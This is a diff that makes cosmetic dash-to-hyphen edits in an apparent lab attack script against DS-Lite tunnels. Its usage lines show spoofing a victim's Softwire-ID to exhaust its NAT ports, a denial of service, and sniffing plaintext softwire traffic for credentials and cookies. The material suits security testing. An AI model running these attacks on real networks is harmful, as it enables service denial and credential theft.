@@ -1,6 +1,6 @@
 #!/usr/bin/python
-# T3 – Softwire Endpoint Spoofing & On-Path MITM (poison both endpoints, relay)
-# T4 – Unencrypted Tunnel Traffic Interception (read the softwire plaintext)
+# T3 - Softwire Endpoint Spoofing & On-Path MITM (poison both endpoints, relay)
+# T4 - Unencrypted Tunnel Traffic Interception (read the softwire plaintext)
 #
 # DS-Lite relies on the B4's IPv6 source address (Softwire-ID) to identify
 # subscribers. There is NO cryptographic authentication of this address.
@@ -17,14 +17,14 @@
 # Attacker position: ISP network (2001:db8:cafe::/64)
 #
 # Usage:
-#   # T3 – spoof B4-1's identity, inject TCP traffic:
+#   # T3 - spoof B4-1's identity, inject TCP traffic:
 #   python3 tunnel_spoof.py spoof --interface eth-isp \
 #       --src-ip6 2001:db8:cafe::150 --victim-b4-ip6 <B4-1-IPv6> \
 #       --aftr-ip6 2001:db8:cafe::10 \
 #       --inner-src-ip4 10.0.1.50 --inner-dst-ip4 198.51.100.2 \
 #       --proto tcp --count 20
 #
-#   # T4 – passive sniff of all softwire traffic:
+#   # T4 - passive sniff of all softwire traffic:
 #   python3 tunnel_spoof.py sniff --interface eth-isp \
 #       --aftr-ip6 2001:db8:cafe::10 --output-pcap /tmp/softwire.pcap
 import argparse
@@ -115,7 +115,7 @@ def run_spoof(args):
 
     Impact: attacker's traffic consumes victim B4's NAT port pool.
     Once the pool is exhausted, the real victim cannot create new
-    connections — effective denial of service via identity theft.
+    connections - effective denial of service via identity theft.
     """
     iface = args.interface
     import random
@@ -149,7 +149,7 @@ def run_spoof(args):
 
     print()
     print("=" * 64)
-    print("  T3 – Softwire Endpoint Spoofing & On-Path MITM (Softwire-ID Forgery)")
+    print("  T3 - Softwire Endpoint Spoofing & On-Path MITM (Softwire-ID Forgery)")
     print("=" * 64)
     print()
     print("  Scenario")
@@ -186,7 +186,7 @@ def run_spoof(args):
     print(f"[*] AFTR MAC: {dmac}")
     print()
 
-    # Build batches of spoofed packets — each with a unique inner-src-IP
+    # Build batches of spoofed packets - each with a unique inner-src-IP
     # and random ports to create maximum distinct NAT bindings.
     # Uses the victim's inner IPv4 subnet (e.g. 10.0.1.0/24) as source
     # range so AFTR routes them through the victim's tunnel/pool.
@@ -274,7 +274,7 @@ def _extract_inner_ip(pkt):
         # by checking that it comes after the IPv6 layer in the stack
         candidate = pkt[IP]
         if candidate.underlayer is not None and not candidate.underlayer.haslayer(IPv6):
-            pass  # outer IP — fall through to manual parse
+            pass  # outer IP - fall through to manual parse
         else:
             return candidate
 
@@ -363,7 +363,7 @@ def run_sniff(args):
 
     print()
     print("=" * 64)
-    print("  T4 – Unencrypted Tunnel Traffic Interception")
+    print("  T4 - Unencrypted Tunnel Traffic Interception")
     print("=" * 64)
     print()
     print("  Scenario")
@@ -375,7 +375,7 @@ def run_sniff(args):
     print("  What this attack does")
     print("  ---------------------")
     print("  DS-Lite tunnels (IPv4-in-IPv6) carry subscriber traffic in")
-    print("  plaintext — RFC 6333 does not mandate encryption.  Any node")
+    print("  plaintext - RFC 6333 does not mandate encryption.  Any node")
     print("  on the ISP L2 segment between B4 and AFTR can passively")
     print("  capture all encapsulated IPv4 traffic: HTTP, DNS, credentials,")
     print("  session cookies, and any other unencrypted application data.")
